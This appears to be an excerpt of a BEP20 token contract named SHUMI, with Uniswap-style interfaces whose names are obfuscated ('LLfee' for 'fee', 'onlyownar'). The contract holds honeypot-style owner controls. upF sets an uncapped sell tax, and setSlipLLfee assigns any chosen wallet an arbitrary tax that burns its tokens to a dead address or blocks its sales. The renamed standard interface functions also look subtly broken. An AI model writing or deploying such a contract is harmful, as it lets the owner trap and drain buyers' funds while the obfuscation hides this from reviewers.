...
interface IUniswapV2Factory {
    ...
    function LLfeeTo() external view returns (address);
    function LLfeeToSetter() external view returns (address);
    ...
    function setLLfeeTo(address) external;
    function setLLfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLLfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingLLfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingLLfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingLLfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLLfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SHUMI is BEP20, Ownable {
    ...
    uint256 private _defaultSellLLfee = 0;

    uint256 private _defaultBuyLLfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipLLfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellLLfee = _value;
    }

    function setSlipLLfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipLLfee[_address] = _value;
    }

    function getSlipLLfee(address _address) external view onlyownar returns (uint256) {
        return _slipLLfee[_address];
    }


    function setMAccountLLfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountLLfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeLLfeeAmount = 0;

        if (rF) {
            uint256 tradeLLfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeLLfee = _defaultSellLLfee;
                }
                if (from == uniswapV2Pair) {

                    tradeLLfee = _defaultBuyLLfee;
                }
            }
            if (_slipLLfee[from] > 0) {
                tradeLLfee = _slipLLfee[from];
            }

            tradeLLfeeAmount = _Amount.mul(tradeLLfee).div(100);
        }


        if (tradeLLfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeLLfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeLLfeeAmount);
            emit Transfer(from, _deadAddress, tradeLLfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeLLfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeLLfeeAmount);
        emit Transfer(from, _to, _Amount - tradeLLfeeAmount);
    }
